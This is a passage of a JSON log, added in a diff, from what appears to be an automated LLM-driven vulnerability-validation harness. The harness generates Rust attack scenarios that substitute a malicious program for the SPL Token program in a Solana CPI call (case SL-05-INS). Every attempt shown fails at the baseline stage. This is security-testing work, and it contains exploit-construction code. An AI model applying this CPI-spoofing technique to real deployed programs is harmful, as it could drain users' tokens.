+                "head": "0000000000000000",
+                "digest": "2aa1fd6b1e4d7e43",
+                "post": "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000000",
+                "digest": "2aa1fd6b1e4d7e43",
+                "post": "000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "02000000d9b33eab",
+                "digest": "2358ab3601f0524c",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3407 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 2873 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: incorrect program id for instruction"
+        ],
+        "elapsed_s": 1.9
+      },
+      "verdict": null,
+      "reason": "o baseline 'cpi legítimo com SPL Token' falhou com Failure(InvalidAccountData); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 4,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3213,
+        "completion_tokens": 1260,
+        "latency_s": 4.92
+      },
+      "raw": "{\"plan\": \"O baseline falhou porque as contas source/destination tinham dados zerados, o que o SPL Token rejeita como InvalidAccountData. Vou montar contas de token validas (mint, owner, amount) para o baseline ter sucesso. No ataque, substituo o token_program pelo programa do atacante, que aceita qualquer instrucao, e meco o dano verificando que o programa atacante foi de fato invocado (lamports/estado alterados) em vez do SPL Token.\", \"scenario\": \"let attacker_program = env.attacker_program.expect(\\\"attacker program required\\\");\\n\\nlet spl_token_id = Pubkey::new_from_array([\\n    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70, 206, 235, 121, 172,\\n    28, 180, 133, 237, 95, 91, 55, 145, 58, 140, 245, 133, 126, 255, 0, 169,\\n]);\\n\\nlet source = Pubkey::new_unique();\\nlet destination = Pubkey::new_unique();\\nlet authority = Pubkey::new_unique();\\nlet mint = Pubkey::new_unique();\\n\\n// Conta SPL Token valida: mint(32) + owner(32) + amount(8) + state(1) + ...\\nlet mut source_data = Vec::new();\\nsource_data.extend_from_slice(mint.as_ref());\\nlet mut owner_bytes = [0u8; 32];\\nowner_bytes.copy_from_slice(authority.as_ref());\\nsource_data.extend_from_slice(&owner_bytes);\\nsource_data.extend_from_slice(&1_000_000u64.to_le_bytes());\\nsource_data.push(1u8); // state = initialized\\nsource_data.resize(165, 0);\\n\\nlet mut dest_data = Vec::new();\\ndest_data.extend_from_slice(mint.as_ref());\\ndest_data.extend_from_slice(&owner_bytes);\\ndest_data.extend_from_slice(&0u64.to_le_bytes());\\ndest_data.push(1u8);\\ndest_data.resize(165, 0);\\n\\nlet source_account = account(&spl_token_id, &source_data, None);\\nlet destination_account = account(&spl_token_id, &dest_data, None);\\nlet authority_account = wallet(1_000_000_000);\\n\\nlet token_program_account = program_account(&spl_token_id);\\nlet attacker_program_account = program_account(&attacker_program);\\n\\nlet baseline_ix = env.anchor_ix(\\n    \\\"cpi\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(source, false),\\n        AccountMeta::new(destination, false),\\n        AccountMeta::new_readonly(authority, true),\\n        AccountMeta::new_readonly(spl_token_id, false),\\n    ],\\n);\\nlet baseline_accounts = vec![\\n    (source, source_account.clone()),\\n    (destination, destination_account.clone()),\\n    (authority, authority_account.clone()),\\n    (spl_token_id, token_program_account.clone()),\\n];\\nlet _baseline_result = env.baseline(\\\"cpi legitimo com SPL Token\\\", &baseline_ix, &baseline_accounts);\\n\\nlet attack_ix = env.anchor_ix(\\n    \\\"cpi\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(source, false),\\n        AccountMeta::new(destination, false),\\n        AccountMeta::new_readonly(authority, true),\\n        AccountMeta::new_readonly(attacker_program, false),\\n    ],\\n);\\nlet attack_accounts = vec![\\n    (source, source_account.clone()),\\n    (destination, destination_account.clone()),\\n    (authority, authority_account.clone()),\\n    (attacker_program, attacker_program_account.clone()),\\n];\\nlet attack_result = env.attack(\\\"cpi com token_program malicioso\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let attacker_after = after(&attack_result, &attacker_program);\\n    let source_after = after(&attack_result, &source);\\n    let destination_after = after(&attack_result, &destination);\\n\\n    let attacker_lamports_before = attacker_program_account.lamports();\\n    let attacker_lamports_after = attacker_after.lamports();\\n    env.effect(\\n        \\\"programa atacante foi invocado (lamports reduzidos)\\\",\\n        attacker_lamports_after < attacker_lamports_before,\\n    );\\n\\n    let source_data_before = source_account.data();\\n    let source_data_after = source_after.data();\\n    env.effect(\\n        \\\"dados da conta source alterados pelo atacante\\\",\\n        source_data_after != source_data_before,\\n    );\\n\\n    let destination_data_before = destination_account.data();\\n    let destination_data_after = destination_after.data();\\n    env.effect(\\n        \\\"dados da conta destination alterados pelo atacante\\\",\\n        destination_data_after != destination_data_before,\\n    );\\n}\"}",
+      "plan": "O baseline falhou porque as contas source/destination tinham dados zerados, o que o SPL Token rejeita como InvalidAccountData. Vou montar contas de token validas (mint, owner, amount) para o baseline ter sucesso. No ataque, substituo o token_program pelo programa do atacante, que aceita qualquer instrucao, e meco o dano verificando que o programa atacante foi de fato invocado (lamports/estado alterados) em vez do SPL Token.",
+      "scenario": "let attacker_program = env.attacker_program.expect(\"attacker program required\");\n\nlet spl_token_id = Pubkey::new_from_array([\n    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70, 206, 235, 121, 172,\n    28, 180, 133, 237, 95, 91, 55, 145, 58, 140, 245, 133, 126, 255, 0, 169,\n]);\n\nlet source = Pubkey::new_unique();\nlet destination = Pubkey::new_unique();\nlet authority = Pubkey::new_unique();\nlet mint = Pubkey::new_unique();\n\n// Conta SPL Token valida: mint(32) + owner(32) + amount(8) + state(1) + ...\nlet mut source_data = Vec::new();\nsource_data.extend_from_slice(mint.as_ref());\nlet mut owner_bytes = [0u8; 32];\nowner_bytes.copy_from_slice(authority.as_ref());\nsource_data.extend_from_slice(&owner_bytes);\nsource_data.extend_from_slice(&1_000_000u64.to_le_bytes());\nsource_data.push(1u8); // state = initialized\nsource_data.resize(165, 0);\n\nlet mut dest_data = Vec::new();\ndest_data.extend_from_slice(mint.as_ref());\ndest_data.extend_from_slice(&owner_bytes);\ndest_data.extend_from_slice(&0u64.to_le_bytes());\ndest_data.push(1u8);\ndest_data.resize(165, 0);\n\nlet source_account = account(&spl_token_id, &source_data, None);\nlet destination_account = account(&spl_token_id, &dest_data, None);\nlet authority_account = wallet(1_000_000_000);\n\nlet token_program_account = program_account(&spl_token_id);\nlet attacker_program_account = program_account(&attacker_program);\n\nlet baseline_ix = env.anchor_ix(\n    \"cpi\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(source, false),\n        AccountMeta::new(destination, false),\n        AccountMeta::new_readonly(authority, true),\n        AccountMeta::new_readonly(spl_token_id, false),\n    ],\n);\nlet baseline_accounts = vec![\n    (source, source_account.clone()),\n    (destination, destination_account.clone()),\n    (authority, authority_account.clone()),\n    (spl_token_id, token_program_account.clone()),\n];\nlet _baseline_result = env.baseline(\"cpi legitimo com SPL Token\", &baseline_ix, &baseline_accounts);\n\nlet attack_ix = env.anchor_ix(\n    \"cpi\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(source, false),\n        AccountMeta::new(destination, false),\n        AccountMeta::new_readonly(authority, true),\n        AccountMeta::new_readonly(attacker_program, false),\n    ],\n);\nlet attack_accounts = vec![\n    (source, source_account.clone()),\n    (destination, destination_account.clone()),\n    (authority, authority_account.clone()),\n    (attacker_program, attacker_program_account.clone()),\n];\nlet attack_result = env.attack(\"cpi com token_program malicioso\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let attacker_after = after(&attack_result, &attacker_program);\n    let source_after = after(&attack_result, &source);\n    let destination_after = after(&attack_result, &destination);\n\n    let attacker_lamports_before = attacker_program_account.lamports();\n    let attacker_lamports_after = attacker_after.lamports();\n    env.effect(\n        \"programa atacante foi invocado (lamports reduzidos)\",\n        attacker_lamports_after < attacker_lamports_before,\n    );\n\n    let source_data_before = source_account.data();\n    let source_data_after = source_after.data();\n    env.effect(\n        \"dados da conta source alterados pelo atacante\",\n        source_data_after != source_data_before,\n    );\n\n    let destination_data_before = destination_account.data();\n    let destination_data_after = destination_after.data();\n    env.effect(\n        \"dados da conta destination alterados pelo atacante\",\n        destination_data_after != destination_data_before,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "cpi legitimo com SPL Token",
+            "result": "Failure(InvalidAccountData)",
+            "compute_units": 3407,
+            "account_flags": "-w,-w,sr,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000005",
+                "digest": "7d866d6578b44e98",
+                "post": "0000000000000005000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000040420f0000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000005",
+                "digest": "2e2882196bdb4186",
+                "post": "000000000000000500000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "0200000027f190b1",
+                "digest": "5b31219b7bc4060b",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "cpi com token_program malicioso",
+            "result": "Failure(IncorrectProgramId)",
+            "compute_units": 2873,
+            "account_flags": "-w,-w,sr,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000005",
+                "digest": "7d866d6578b44e98",
+                "post": "0000000000000005000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000040420f0000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000005",
+                "digest": "2e2882196bdb4186",
+                "post": "000000000000000500000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "02000000d9b33eab",
+                "digest": "2358ab3601f0524c",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3407 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 2873 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: incorrect program id for instruction"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": null,
+      "reason": "o baseline 'cpi legitimo com SPL Token' falhou com Failure(InvalidAccountData); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    },
+    {
+      "attempt": 5,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3396,
+        "completion_tokens": 1395,
+        "latency_s": 5.72
+      },
+      "raw": "{\"plan\": \"O baseline falhou com InvalidAccountData porque as contas SPL Token foram montadas com layout incorreto (o campo state deve ser 1 byte no offset 108, e o layout precisa ser exatamente 165 bytes com o padding correto). Vou montar contas SPL Token validas com mint, owner, amount e state corretos, e o authority como signer. O baseline chama `cpi` com o SPL Token real; o ataque substitui apenas o token_program pelo programa do atacante. O efeito mede se o programa atacante foi invocado (lamports reduzidos) ou se os dados das contas foram alterados.\", \"scenario\": \"let attacker_program = env.attacker_program.expect(\\\"attacker program required\\\");\\n\\nlet spl_token_id = Pubkey::new_from_array([\\n    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70, 206, 235, 121, 172,\\n    28, 180, 133, 237, 95, 91, 55, 145, 58, 140, 245, 133, 126, 255, 0, 169,\\n]);\\n\\nlet source = Pubkey::new_unique();\\nlet destination = Pubkey::new_unique();\\nlet authority = Pubkey::new_unique();\\nlet mint = Pubkey::new_unique();\\n\\n// Layout SPL Token Account: mint(32) + owner(32) + amount(8) + delegate(4+32) + state(1) + is_native(4+8) + delegated_amount(8) + close_authority(4+32) = 165\\nlet mut source_data = vec![0u8; 165];\\nsource_data[0..32].copy_from_slice(mint.as_ref());\\nsource_data[32..64].copy_from_slice(authority.as_ref());\\nsource_data[64..72].copy_from_slice(&1_000_000u64.to_le_bytes());\\n// delegate: COption::None -> 4 bytes zero (ja zero)\\n// state = 1 (Initialized) no offset 108\\nsource_data[108] = 1u8;\\n// is_native: COption::None -> 4 bytes zero (ja zero)\\n// delegated_amount: 0 (ja zero)\\n// close_authority: COption::None -> 4 bytes zero (ja zero)\\n\\nlet mut dest_data = vec![0u8; 165];\\ndest_data[0..32].copy_from_slice(mint.as_ref());\\ndest_data[32..64].copy_from_slice(authority.as_ref());\\ndest_data[64..72].copy_from_slice(&0u64.to_le_bytes());\\ndest_data[108] = 1u8;\\n\\nlet source_account = account(&spl_token_id, &source_data, None);\\nlet destination_account = account(&spl_token_id, &dest_data, None);\\nlet authority_account = wallet(1_000_000_000);\\n\\nlet token_program_account = program_account(&spl_token_id);\\nlet attacker_program_account = program_account(&attacker_program);\\n\\nlet baseline_ix = env.anchor_ix(\\n    \\\"cpi\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(source, false),\\n        AccountMeta::new(destination, false),\\n        AccountMeta::new_readonly(authority, true),\\n        AccountMeta::new_readonly(spl_token_id, false),\\n    ],\\n);\\nlet baseline_accounts = vec![\\n    (source, source_account.clone()),\\n    (destination, destination_account.clone()),\\n    (authority, authority_account.clone()),\\n    (spl_token_id, token_program_account.clone()),\\n];\\nlet _baseline_result = env.baseline(\\\"cpi legitimo com SPL Token\\\", &baseline_ix, &baseline_accounts);\\n\\nlet attack_ix = env.anchor_ix(\\n    \\\"cpi\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(source, false),\\n        AccountMeta::new(destination, false),\\n        AccountMeta::new_readonly(authority, true),\\n        AccountMeta::new_readonly(attacker_program, false),\\n    ],\\n);\\nlet attack_accounts = vec![\\n    (source, source_account.clone()),\\n    (destination, destination_account.clone()),\\n    (authority, authority_account.clone()),\\n    (attacker_program, attacker_program_account.clone()),\\n];\\nlet attack_result = env.attack(\\\"cpi com token_program malicioso\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    let attacker_after = after(&attack_result, &attacker_program);\\n    let source_after = after(&attack_result, &source);\\n    let destination_after = after(&attack_result, &destination);\\n\\n    let attacker_lamports_before = attacker_program_account.lamports();\\n    let attacker_lamports_after = attacker_after.lamports();\\n    env.effect(\\n        \\\"programa atacante foi invocado (lamports reduzidos)\\\",\\n        attacker_lamports_after < attacker_lamports_before,\\n    );\\n\\n    let source_data_before = source_account.data();\\n    let source_data_after = source_after.data();\\n    env.effect(\\n        \\\"dados da conta source alterados pelo atacante\\\",\\n        source_data_after != source_data_before,\\n    );\\n\\n    let destination_data_before = destination_account.data();\\n    let destination_data_after = destination_after.data();\\n    env.effect(\\n        \\\"dados da conta destination alterados pelo atacante\\\",\\n        destination_data_after != destination_data_before,\\n    );\\n}\"}",
+      "plan": "O baseline falhou com InvalidAccountData porque as contas SPL Token foram montadas com layout incorreto (o campo state deve ser 1 byte no offset 108, e o layout precisa ser exatamente 165 bytes com o padding correto). Vou montar contas SPL Token validas com mint, owner, amount e state corretos, e o authority como signer. O baseline chama `cpi` com o SPL Token real; o ataque substitui apenas o token_program pelo programa do atacante. O efeito mede se o programa atacante foi invocado (lamports reduzidos) ou se os dados das contas foram alterados.",
+      "scenario": "let attacker_program = env.attacker_program.expect(\"attacker program required\");\n\nlet spl_token_id = Pubkey::new_from_array([\n    6, 221, 246, 225, 215, 101, 161, 147, 217, 203, 225, 70, 206, 235, 121, 172,\n    28, 180, 133, 237, 95, 91, 55, 145, 58, 140, 245, 133, 126, 255, 0, 169,\n]);\n\nlet source = Pubkey::new_unique();\nlet destination = Pubkey::new_unique();\nlet authority = Pubkey::new_unique();\nlet mint = Pubkey::new_unique();\n\n// Layout SPL Token Account: mint(32) + owner(32) + amount(8) + delegate(4+32) + state(1) + is_native(4+8) + delegated_amount(8) + close_authority(4+32) = 165\nlet mut source_data = vec![0u8; 165];\nsource_data[0..32].copy_from_slice(mint.as_ref());\nsource_data[32..64].copy_from_slice(authority.as_ref());\nsource_data[64..72].copy_from_slice(&1_000_000u64.to_le_bytes());\n// delegate: COption::None -> 4 bytes zero (ja zero)\n// state = 1 (Initialized) no offset 108\nsource_data[108] = 1u8;\n// is_native: COption::None -> 4 bytes zero (ja zero)\n// delegated_amount: 0 (ja zero)\n// close_authority: COption::None -> 4 bytes zero (ja zero)\n\nlet mut dest_data = vec![0u8; 165];\ndest_data[0..32].copy_from_slice(mint.as_ref());\ndest_data[32..64].copy_from_slice(authority.as_ref());\ndest_data[64..72].copy_from_slice(&0u64.to_le_bytes());\ndest_data[108] = 1u8;\n\nlet source_account = account(&spl_token_id, &source_data, None);\nlet destination_account = account(&spl_token_id, &dest_data, None);\nlet authority_account = wallet(1_000_000_000);\n\nlet token_program_account = program_account(&spl_token_id);\nlet attacker_program_account = program_account(&attacker_program);\n\nlet baseline_ix = env.anchor_ix(\n    \"cpi\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(source, false),\n        AccountMeta::new(destination, false),\n        AccountMeta::new_readonly(authority, true),\n        AccountMeta::new_readonly(spl_token_id, false),\n    ],\n);\nlet baseline_accounts = vec![\n    (source, source_account.clone()),\n    (destination, destination_account.clone()),\n    (authority, authority_account.clone()),\n    (spl_token_id, token_program_account.clone()),\n];\nlet _baseline_result = env.baseline(\"cpi legitimo com SPL Token\", &baseline_ix, &baseline_accounts);\n\nlet attack_ix = env.anchor_ix(\n    \"cpi\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(source, false),\n        AccountMeta::new(destination, false),\n        AccountMeta::new_readonly(authority, true),\n        AccountMeta::new_readonly(attacker_program, false),\n    ],\n);\nlet attack_accounts = vec![\n    (source, source_account.clone()),\n    (destination, destination_account.clone()),\n    (authority, authority_account.clone()),\n    (attacker_program, attacker_program_account.clone()),\n];\nlet attack_result = env.attack(\"cpi com token_program malicioso\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    let attacker_after = after(&attack_result, &attacker_program);\n    let source_after = after(&attack_result, &source);\n    let destination_after = after(&attack_result, &destination);\n\n    let attacker_lamports_before = attacker_program_account.lamports();\n    let attacker_lamports_after = attacker_after.lamports();\n    env.effect(\n        \"programa atacante foi invocado (lamports reduzidos)\",\n        attacker_lamports_after < attacker_lamports_before,\n    );\n\n    let source_data_before = source_account.data();\n    let source_data_after = source_after.data();\n    env.effect(\n        \"dados da conta source alterados pelo atacante\",\n        source_data_after != source_data_before,\n    );\n\n    let destination_data_before = destination_account.data();\n    let destination_data_after = destination_after.data();\n    env.effect(\n        \"dados da conta destination alterados pelo atacante\",\n        destination_data_after != destination_data_before,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "cpi legitimo com SPL Token",
+            "result": "Failure(InvalidAccountData)",
+            "compute_units": 3407,
+            "account_flags": "-w,-w,sr,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000005",
+                "digest": "25dbfaaa84d21ac5",
+                "post": "0000000000000005000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000040420f0000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000005",
+                "digest": "51ceaf2f4747e913",
+                "post": "000000000000000500000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "0200000027f190b1",
+                "digest": "5b31219b7bc4060b",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "cpi com token_program malicioso",
+            "result": "Failure(IncorrectProgramId)",
+            "compute_units": 2873,
+            "account_flags": "-w,-w,sr,-r",
+            "ix_head": "4cad065fb55d53ce",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000005",
+                "digest": "25dbfaaa84d21ac5",
+                "post": "0000000000000005000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000040420f0000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",
+                "data_len": 165,
+                "head": "0000000000000005",
+                "digest": "51ceaf2f4747e913",
+                "post": "000000000000000500000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+              },
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": false,
+                "writable": false,
+                "owner": "BPFLoaderUpgradeab1e11111111111111111111111",
+                "data_len": 36,
+                "head": "02000000d9b33eab",
+                "digest": "2358ab3601f0524c",
+                "post": ""
+              }
+            ]
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA invoke [2]",
+          "Program TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 3407 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: invalid account data for instruction",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 2873 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: incorrect program id for instruction"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o baseline 'cpi legitimo com SPL Token' falhou com Failure(InvalidAccountData); o uso legitimo precisa ter sucesso (revise layout das contas, seeds, flags de assinatura/escrita e argumentos)"
+    }
+  ],
+  "case_id": "SL-05-INS",
+  "static_finding": {
+    "category": "CPI",
+    "confidence": "high",
+    "evidence": "token_program: AccountInfo<'info>,\n...\nsolana_program::program::invoke(\n    &spl_token::instruction::transfer(\n        ctx.accounts.token_program.key,\n        ...",
+    "explanation": "A conta do programa destino (`token_program`) e recebida como `AccountInfo` generica e sua chave publica e usada diretamente na construcao da instrucao de transferencia sem qualquer verificacao de que corresponde ao programa SPL Token esperado. Um atacante pode fornecer um programa malicioso no lugar do token_program.",
